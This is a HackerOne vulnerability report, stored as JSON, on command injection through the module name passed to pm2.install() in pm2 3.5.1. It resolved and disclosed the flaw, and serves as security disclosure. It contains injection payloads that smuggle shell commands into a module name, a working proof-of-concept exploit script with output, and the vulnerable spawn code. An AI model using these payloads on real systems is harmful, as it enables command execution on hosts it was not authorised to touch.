{
  "id": 633364,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzMzNjQ=",
  "url": "https://hackerone.com/reports/633364",
  "title": "Command Injection in npm module name passed as an argument to pm2.install() function",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-07-02T00:16:39.830Z",
  "submitted_at": "2019-07-02T00:16:39.830Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-10-24T09:52:54.847Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-09-24T09:52:48.768Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Lads,\n\nI would like to report Command Injection possible when npm module name is passed into `pm2.install()`. An attacker is able to attach OS commands to npm module name and those commands will be executed when payload reaches execution sink in `continueInstall()` function in `API/Modules/NPM.js` file.\n\n# Module\n\n**module name:** pm2\n**version:** 3.5.1\n**npm page:** `https://www.npmjs.com/package/pm2`\n\n## Module Description\n\nPM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.\n\n## Module Stats\n\n**~320.000 downloads/week**\n**>1.200.000 downloads/month**\n\n# Vulnerability\n\nnpm packages can be installed using `pm2 install [PACKAGE NAME]` command run from command line or as a call to `pm2.install(PACKAGE_NAME)` when `pm2` API is used in programmatic way. Both ways of execution are vulnerable.\n\nHere's an example of exploitation when `test` package is installed from command line with `pm2 install \"test;pwd;whoami;uname;\"` command:\n\n```\nbl4de:~/playground/Node $ ./pm2 install \"test;pwd;whoami;uname;\"\n[PM2][Module] Installing NPM test;pwd;whoami;uname; module\n[PM2][Module] Calling [NPM] to install test;pwd;whoami;uname; ...\nnpm WARN saveError ENOENT: no such file or directory, open '/Users/bl4de/package.json'\nnpm WARN enoent ENOENT: no such file or directory, open '/Users/bl4de/package.json'\nnpm WARN bl4de No description\nnpm WARN bl4de No repository field.\nnpm WARN bl4de No README data\nnpm WARN bl4de No license field.\n\n+ test@0.6.0\nupdated 1 package and audited 3 packages in 0.902s\nfound 0 vulnerabilities\n\n/Users/bl4de\nbl4de\nDarwin\n/bin/sh: --loglevel=error: command not found\n[PM2][ERROR] Installation failed via NPM, module has been restored to prev version\n┌──────────┬────┬─────────┬──────┬───────┬────────┬─────────┬────────┬──────┬───────────┬───────┬──────────┐\n│ App name │ id │ version │ mode │ pid   │ status │ restart │ uptime │ cpu  │ mem       │ user  │ watching │\n├──────────┼────┼─────────┼──────┼───────┼────────┼─────────┼────────┼──────┼───────────┼───────┼──────────┤\n│ app      │ 0  │ N/A     │ fork │ 86409 │ online │ 1220    │ 1s     │ 6.5% │ 31.9 MB   │ bl4de │ disabled │\n└──────────┴────┴─────────┴──────┴───────┴────────┴─────────┴────────┴──────┴───────────┴───────┴──────────┘\nModule\n┌────────┬────┬─────────┬───────┬────────┬─────────┬──────┬───────────┬───────┐\n│ Module │ id │ version │ pid   │ status │ restart │ cpu  │ memory    │ user  │\n├────────┼────┼─────────┼───────┼────────┼─────────┼──────┼───────────┼───────┤\n│ test   │ 1  │ 0.6.0   │ 86405 │ online │ 1216    │ 3.5% │ 32.3 MB   │ bl4de │\n└────────┴────┴─────────┴───────┴────────┴─────────┴──────┴───────────┴───────┘\n Use `pm2 show <id|name>` to get more details about an app\nbl4de:~/playground/Node $\n```\n\nAs you can see, there is an output from `pwd`, 'whoami` and `uname` commands injected as a part of npm module name.\n\n\nHere's sample PoC which exploits this vulnerability when `pm2` API is used in separate application:\n\n```javascript\n// pm2_exploit.js\n\n\n'use strict'\nconst pm2 = require('pm2')\n\n// payload - user controllable input\nconst payload = \"test;pwd;whoami;uname -a;ls -l ~/playground/Node;\"\n\npm2.connect(function (err) {\n    if (err) {\n        console.error(err)\n        process.exit(2)\n    }\n\n    pm2.start({\n        script: 'app.js' // fake app.js to supress \"No script path - aborting\" error thrown from PM2\n    }, (err, apps) => {\n        pm2.install(payload, {}) // injection\n        pm2.disconnect()\n        if (err) {\n            throw err\n        }\n    })\n})\n```\n\nAfter executing it with `node pm2_exploit.js` command, we get following output:\n\n```\nbl4de:~/playground/Node $ node pm2_exploit.js\nnpm WARN saveError ENOENT: no such file or directory, open '/Users/bl4de/package.json'\nnpm WARN enoent ENOENT: no such file or directory, open '/Users/bl4de/package.json'\nnpm WARN bl4de No description\nnpm WARN bl4de No repository field.\nnpm WARN bl4de No README data\nnpm WARN bl4de No license field.\n\n+ test@0.6.0\nupdated 1 package and audited 3 packages in 0.427s\nfound 0 vulnerabilities\n\n/Users/bl4de\nbl4de\nDarwin bl4des-MacBook-Pro.local 18.6.0 Darwin Kernel Version 18.6.0: Thu Apr 25 23:16:27 PDT 2019; root:xnu-4903.261.4~2/RELEASE_X86_64 x86_64\ntotal 224\n-rw-r--r--@   1 bl4de  staff      37 Jul  1 22:38 app.js\ndrwxr-xr-x  237 bl4de  staff    7584 Jun 26 19:52 node_modules\n-rw-r--r--    1 bl4de  staff  104809 Jul  2 00:52 package-lock.json\nlrwxr-xr-x    1 bl4de  staff      26 Jun 26 20:18 pm2 -> ./node_modules/pm2/bin/pm2\n-rw-r--r--@   1 bl4de  staff     522 Jul  2 00:58 pm2_exploit.js\n/bin/sh: --loglevel=error: command not found\n```\n\nAgain, commands injected as a part of npm module were executed successfully.\n\n{F520355}\n\n\n## Vulnerability Description\n\nSimilar to `https://hackerone.com/reports/630227`, the exploitation chain starts in `lib/API/Modules/Modularizer.js` in `Modularizer.install()` function call (I've cut part of the code which is not relevant to the vulnerability):\n\n\n```javascript\n\n/**\n * PM2 Module System.\n */\nModularizer.install = function (CLI, module_name, opts, cb) {\n  if (typeof(opts) == 'function') {\n    cb = opts;\n    opts = {};\n  }\n\n    (...)\n\n  else {\n    Common.logMod(`Installing NPM ${module_name} module`);\n    NPM.install(CLI, module_name, opts, cb)   //// injection point\n  }\n};\n\n```\n\n{F520353}\n\nIn line marked with `//// injection point` comment, unsanitized `module_name` variable is passed into `NPM.install()` function in `lib/API/Modules/NPM.js` module. \n\nFrom here, our unsanitized payload continues his journey to execution sink, passed as second argument into `NPM.continueInstall()`:\n\n\n```javascript\nfunction install(CLI, module_name, opts, cb) {\n  moduleExistInLocalDB(CLI, module_name, function (exists) {\n    if (exists) {\n      Common.logMod('Module already installed. Updating.');\n\n      Rollback.backup(module_name);\n\n      return uninstall(CLI, module_name, function () {\n        return continueInstall(CLI, module_name, opts, cb);\n      });\n    }\n    return continueInstall(CLI, module_name, opts, cb);  //// injection point\n  })\n}\n```\n\nFinally, it reaches its destination. As `continueInstall()` is quite long, I've left only the part which is important for our PoC:\n\n```javascript\n\nfunction continueInstall(CLI, module_name, opts, cb) {\n  Common.printOut(cst.PREFIX_MSG_MOD + 'Calling ' + chalk.bold.red('[NPM]') + ' to install ' + module_name + ' ...');\n\n  var canonic_module_name = Utility.getCanonicModuleName(module_name);\n  var install_path = path.join(cst.DEFAULT_MODULE_PATH, canonic_module_name);\n\n  require('mkdirp')(install_path, function() {\n    process.chdir(os.homedir());\n\n    var install_instance = spawn(cst.IS_WINDOWS ? 'npm.cmd' : 'npm', ['install', module_name, '--loglevel=error', '--prefix', '\"'+install_path+'\"' ], {\n      stdio : 'inherit',\n      env: process.env,\n\t\t  shell : true\n    });\n\n(...)\n```\n\nAs you can see, `module_name` (after being parsed by `Utility.getCanonicModuleName()` and returned and assigned to `canonic_module_name`) is passed into `spawn()` call and executed as a part of spawned `npm install MODULE_NAME ----loglevel=error --prefix INSTALL_PATH` command.\n\n{F520354}\n\n\n## Steps To Reproduce:\n\n- install pm2 (`npm i pm2`) - I've installed it locally and made symlink to executable `pm2` in the same folder\n- run `pm2 start` to run and verify if `pm2` is installed correctly. You should see output similar to following:\n\n```\nbl4de:~/playground/Node $ ./pm2 start\n[PM2][ERROR] File ecosystem.config.js not found\n┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐\n│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │\n└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘\n Use `pm2 show <id|name>` to get more details about an app\nbl4de:~/playground/Node $\n```\n\n- save `pm2_exploit.js` provided in section above in the same folder and run it with `node pm2_exploit.js` command\n- verify that output contains results of execution of injected commands\n\n## Patch\n\n`module_name` should be sanitized before it reaches execution sink.s\n\n## Supporting Material/References:\n\nVulnerability was tested with following configuration:\n\n- macOS 10.14.5\n- Node 10.13.0\n- npm 6.9.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nCheers,\n\nbl4de\n\n## Impact\n\nAn attacker is able to execute arbitrary commands injecting them as a part of npm module to install with `pm2.install()` call",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 520353,
      "file_name": "1.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/520/353/339128db22c1db830e0f52547c603610cce91fb9/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ764WDPOT%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073755Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJGMEQCIEJCpOT%2FnLAxlJy%2B%2B%2Fa0A%2Fuz9UJx%2BTkeR616HCfZ%2Bl5TAiBPgAvOCdyFK%2Fsu0e4HNruMfHePWlQ2%2B7jDR3qgABsc6SqwBQgpEAMaDDAxMzYxOTI3NDg0OSIMf%2BnUXay0WVRe0QUAKo0FTe%2F3%2F5R16%2FajyCApoURehraE8bgx4wMDslPTf6h5vkZ7QkD6mew0zmZSVVL71O%2BS%2FAAsUL9gjR64cxjTN0fyO6swbmSDfmOouN8529hjbJrHwKh%2Bg%2FqR14Qh%2FwtS9MNlvaaaFYjm15dxLjR1qbkNoM2VW66X%2BaIjFo%2Bjm1L3h4YvC7uD%2BkF5SvvermW8bkX9PbMNWbV0ri7d4nxEYyfmSygHPF3jBUj9qKtE5jIFlUFX7quLROd7IFutIjfbr9BzD5XjBcfDBgOelMJO%2FkBoiNdwlfV9uTG7ZKjiTRJNivEEwodRejMzwiSEZ6GcGSmQR9RpewFhhM%2Fz%2BYkhlE7gFMjx24KTCJ1K3CyskWpwdC68JN9Y8hXezAl7pK2gf3r62LKzvw1%2FJhkqmVuo8i7XCkeS0MYtV7XnpE5p3jBHKTK7q%2FumHS%2FwzVymb2EeSXBP6qNbvr3O18rzDvbqY5uBkazVycShPwpL%2BBDoPdQ%2FbeFqcglYv2oAounyiTXR9eWNtzw8kEZw6AKflmPiQ0DprqSHaiMMAb55fo7dbXjwr20ktZwBZZqenOtvB7eyoQN%2BG2WqO0K44it4aGb6g8ehgYvsRelS0oR5XwTwu2o4F0Fj%2BADJ3%2F5TzGpfal1VqsaCMrr4em0aQJ3rb4Remj%2F%2BJTVleGnaKGbF2teDXflsoK2zwP9nkJ4nvashggxSrAZooM%2BU4pbkYzpxDwMNvMOJWFOf9GozT%2FooeLq5CYQghwJHMTpJ71dTOR%2FqvCNyL8BZYjJA7Wc19LQQ%2FS016DeF1wTf5sdMO0l86aHqv8BSk77LD335DPvtqsjzrJ7qieEjW9dMYJJFmqBMM1OoakNug2zY166La6bNXU3UQhYwjai6qAY6sgHNsBk5AOLuBX1agqrXZLp%2BOkzGnqFdy%2FkFHE6bDXd5K%2BxlNQa21ZdjhDZitHh8OyVITBolLS2EIAdcZfL%2FRZstKTGRFPqW5I%2BMNOHFKWShLCpyVIcbI8q0Una9aOqcZOJOiV54v4hLyirFWKBhoo1td8jT%2BsTbcVm%2BjosOM7etsoiTgM%2FlTBDyy%2BG06%2FdRbqpBa7eB3ENMxwVCTWHA0QHkY6jW1%2F7VKmtouFFTKpcdL3mX&X-Amz-SignedHeaders=host&X-Amz-Signature=e62a654a2dce76741c3798762f69a5c66eed9a00ca1deaa8e3ec7f0087cc40ba",
      "file_size": 724472,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 520354,
      "file_name": "2.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/520/354/4b3c5accfa7c0c0dfe6e88a01b50d38cb053c0dd/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ764WDPOT%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073755Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJGMEQCIEJCpOT%2FnLAxlJy%2B%2B%2Fa0A%2Fuz9UJx%2BTkeR616HCfZ%2Bl5TAiBPgAvOCdyFK%2Fsu0e4HNruMfHePWlQ2%2B7jDR3qgABsc6SqwBQgpEAMaDDAxMzYxOTI3NDg0OSIMf%2BnUXay0WVRe0QUAKo0FTe%2F3%2F5R16%2FajyCApoURehraE8bgx4wMDslPTf6h5vkZ7QkD6mew0zmZSVVL71O%2BS%2FAAsUL9gjR64cxjTN0fyO6swbmSDfmOouN8529hjbJrHwKh%2Bg%2FqR14Qh%2FwtS9MNlvaaaFYjm15dxLjR1qbkNoM2VW66X%2BaIjFo%2Bjm1L3h4YvC7uD%2BkF5SvvermW8bkX9PbMNWbV0ri7d4nxEYyfmSygHPF3jBUj9qKtE5jIFlUFX7quLROd7IFutIjfbr9BzD5XjBcfDBgOelMJO%2FkBoiNdwlfV9uTG7ZKjiTRJNivEEwodRejMzwiSEZ6GcGSmQR9RpewFhhM%2Fz%2BYkhlE7gFMjx24KTCJ1K3CyskWpwdC68JN9Y8hXezAl7pK2gf3r62LKzvw1%2FJhkqmVuo8i7XCkeS0MYtV7XnpE5p3jBHKTK7q%2FumHS%2FwzVymb2EeSXBP6qNbvr3O18rzDvbqY5uBkazVycShPwpL%2BBDoPdQ%2FbeFqcglYv2oAounyiTXR9eWNtzw8kEZw6AKflmPiQ0DprqSHaiMMAb55fo7dbXjwr20ktZwBZZqenOtvB7eyoQN%2BG2WqO0K44it4aGb6g8ehgYvsRelS0oR5XwTwu2o4F0Fj%2BADJ3%2F5TzGpfal1VqsaCMrr4em0aQJ3rb4Remj%2F%2BJTVleGnaKGbF2teDXflsoK2zwP9nkJ4nvashggxSrAZooM%2BU4pbkYzpxDwMNvMOJWFOf9GozT%2FooeLq5CYQghwJHMTpJ71dTOR%2FqvCNyL8BZYjJA7Wc19LQQ%2FS016DeF1wTf5sdMO0l86aHqv8BSk77LD335DPvtqsjzrJ7qieEjW9dMYJJFmqBMM1OoakNug2zY166La6bNXU3UQhYwjai6qAY6sgHNsBk5AOLuBX1agqrXZLp%2BOkzGnqFdy%2FkFHE6bDXd5K%2BxlNQa21ZdjhDZitHh8OyVITBolLS2EIAdcZfL%2FRZstKTGRFPqW5I%2BMNOHFKWShLCpyVIcbI8q0Una9aOqcZOJOiV54v4hLyirFWKBhoo1td8jT%2BsTbcVm%2BjosOM7etsoiTgM%2FlTBDyy%2BG06%2FdRbqpBa7eB3ENMxwVCTWHA0QHkY6jW1%2F7VKmtouFFTKpcdL3mX&X-Amz-SignedHeaders=host&X-Amz-Signature=a2e67ca48abe6f69abb517b464e21689d89e96b0402e3c84fbf78a98fdea54cf",
      "file_size": 862170,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 520355,
      "file_name": "3.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/520/355/02664e2b65f66de5c6b11c2ce08f8e39c2320d2b/3.png?response-content-disposition=attachment%3B%20filename%3D%223.png%22%3B%20filename%2A%3DUTF-8%27%273.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ764WDPOT%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073755Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJGMEQCIEJCpOT%2FnLAxlJy%2B%2B%2Fa0A%2Fuz9UJx%2BTkeR616HCfZ%2Bl5TAiBPgAvOCdyFK%2Fsu0e4HNruMfHePWlQ2%2B7jDR3qgABsc6SqwBQgpEAMaDDAxMzYxOTI3NDg0OSIMf%2BnUXay0WVRe0QUAKo0FTe%2F3%2F5R16%2FajyCApoURehraE8bgx4wMDslPTf6h5vkZ7QkD6mew0zmZSVVL71O%2BS%2FAAsUL9gjR64cxjTN0fyO6swbmSDfmOouN8529hjbJrHwKh%2Bg%2FqR14Qh%2FwtS9MNlvaaaFYjm15dxLjR1qbkNoM2VW66X%2BaIjFo%2Bjm1L3h4YvC7uD%2BkF5SvvermW8bkX9PbMNWbV0ri7d4nxEYyfmSygHPF3jBUj9qKtE5jIFlUFX7quLROd7IFutIjfbr9BzD5XjBcfDBgOelMJO%2FkBoiNdwlfV9uTG7ZKjiTRJNivEEwodRejMzwiSEZ6GcGSmQR9RpewFhhM%2Fz%2BYkhlE7gFMjx24KTCJ1K3CyskWpwdC68JN9Y8hXezAl7pK2gf3r62LKzvw1%2FJhkqmVuo8i7XCkeS0MYtV7XnpE5p3jBHKTK7q%2FumHS%2FwzVymb2EeSXBP6qNbvr3O18rzDvbqY5uBkazVycShPwpL%2BBDoPdQ%2FbeFqcglYv2oAounyiTXR9eWNtzw8kEZw6AKflmPiQ0DprqSHaiMMAb55fo7dbXjwr20ktZwBZZqenOtvB7eyoQN%2BG2WqO0K44it4aGb6g8ehgYvsRelS0oR5XwTwu2o4F0Fj%2BADJ3%2F5TzGpfal1VqsaCMrr4em0aQJ3rb4Remj%2F%2BJTVleGnaKGbF2teDXflsoK2zwP9nkJ4nvashggxSrAZooM%2BU4pbkYzpxDwMNvMOJWFOf9GozT%2FooeLq5CYQghwJHMTpJ71dTOR%2FqvCNyL8BZYjJA7Wc19LQQ%2FS016DeF1wTf5sdMO0l86aHqv8BSk77LD335DPvtqsjzrJ7qieEjW9dMYJJFmqBMM1OoakNug2zY166La6bNXU3UQhYwjai6qAY6sgHNsBk5AOLuBX1agqrXZLp%2BOkzGnqFdy%2FkFHE6bDXd5K%2BxlNQa21ZdjhDZitHh8OyVITBolLS2EIAdcZfL%2FRZstKTGRFPqW5I%2BMNOHFKWShLCpyVIcbI8q0Una9aOqcZOJOiV54v4hLyirFWKBhoo1td8jT%2BsTbcVm%2BjosOM7etsoiTgM%2FlTBDyy%2BG06%2FdRbqpBa7eB3ENMxwVCTWHA0QHkY6jW1%2F7VKmtouFFTKpcdL3mX&X-Amz-SignedHeaders=host&X-Amz-Signature=0f7f91f62c12996b67c47eeba42c52f3a543a6c0bed182bd9e2f31cb07ccd6fd",
      "file_size": 7155466,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2019-10-24T09:52:49.202Z",
  "allow_singular_disclosure_after": -123543906.35421608,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "sagarb1337",
    "wildstyle7",
    "lileggrolls"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.4,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "high",
      "privileges_required": "high",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 5241409,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNeedsMoreInfo",
      "message": "Hello @bl4de - How is this different, compared to #630227? I can see that the two reports follow the same reproduction steps.\n\nCheers,\n@bassguitar ",
      "automated_response": false,
      "created_at": "2019-07-02T21:08:28.132Z",
      "updated_at": "2019-07-02T21:08:28.132Z",
      "actor": {
        "username": "h1_analyst_layla",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_layla",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/xx9fc0e3lc64e3fe90710sz5i27h/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5241456,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNew",
      "message": "Hi @bassguitar ,\n\nReproduction steps are the same and initial injection vector is similar, but the vulnerability exists in two different places and fixing it in one place does not remediate an injection in the second one.\n\nIf you will follow details in provided PoCs in both reports, you will see the differences and that payloads reach two different execution sinks.\n\nCheers,\n\nbl4de\n\n",
      "automated_response": false,
      "created_at": "2019-07-02T21:22:33.347Z",
      "updated_at": "2019-07-02T21:23:00.839Z",
      "actor": {
        "username": "bl4de",
        "cleared": false,
        "verified": false,
        "url": "/bl4de",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5299074,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2019-07-11T09:19:17.343Z",
      "updated_at": "2019-07-11T09:19:17.343Z",
      "additional_data": {
        "old_severity": "Medium",
        "new_severity": "Medium (6.4)",
        "old_severity_id": 448492,
        "new_severity_id": 456057
      },
      "actor": {
        "username": "beagle",
        "cleared": false,
        "verified": false,
        "url": "/beagle",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5299115,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nKind regards,\n@beagle  ",
      "automated_response": false,
      "created_at": "2019-07-11T09:26:43.507Z",
      "updated_at": "2019-07-11T09:26:43.507Z",
      "actor": {
        "username": "beagle",
        "cleared": false,
        "verified": false,
        "url": "/beagle",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5299286,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @beagle ,\n\nThank you for the update!\n\nCheers,\n\nbl4de",
      "automated_response": false,
      "created_at": "2019-07-11T10:10:21.262Z",
      "updated_at": "2019-07-11T10:10:21.262Z",
      "actor": {
        "username": "bl4de",
        "cleared": false,
        "verified": false,
        "url": "/bl4de",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5727747,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@bl4de Thanks for a very details report I will reach out to the pm2 team to notify them (along with #630227).",
      "automated_response": false,
      "created_at": "2019-09-04T12:54:49.590Z",
      "updated_at": "2019-09-04T12:54:49.590Z",
      "actor": {
        "username": "marcinhoppe",
        "cleared": false,
        "verified": false,
        "url": "/marcinhoppe",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5736639,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @marcinhoppe ,\n\nThank you! Let me know if they will need any additional information about those issues.\n\nCheers,\n\nbl4de",
      "automated_response": false,
      "created_at": "2019-09-05T08:57:13.773Z",
      "updated_at": "2019-09-05T08:57:13.773Z",
      "actor": {
        "username": "bl4de",
        "cleared": false,
        "verified": false,
        "url": "/bl4de",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5876088,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "",
      "automated_response": false,
      "created_at": "2019-09-24T09:52:41.748Z",
      "updated_at": "2019-09-24T09:52:41.748Z",
      "actor": {
        "username": "marcinhoppe",
        "cleared": false,
        "verified": false,
        "url": "/marcinhoppe",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "bl4de",
        "url": "/bl4de"
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 5876089,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2019-09-24T09:52:48.791Z",
      "updated_at": "2019-09-24T09:52:48.791Z",
      "first_to_agree": true,
      "actor": {
        "username": "marcinhoppe",
        "cleared": false,
        "verified": false,
        "url": "/marcinhoppe",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 6124043,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2019-10-24T09:52:55.374Z",
      "updated_at": "2019-10-24T09:52:55.374Z",
      "actor": {
        "url": "/nodejs-ecosystem",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Node.js third-party modules"
        }
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
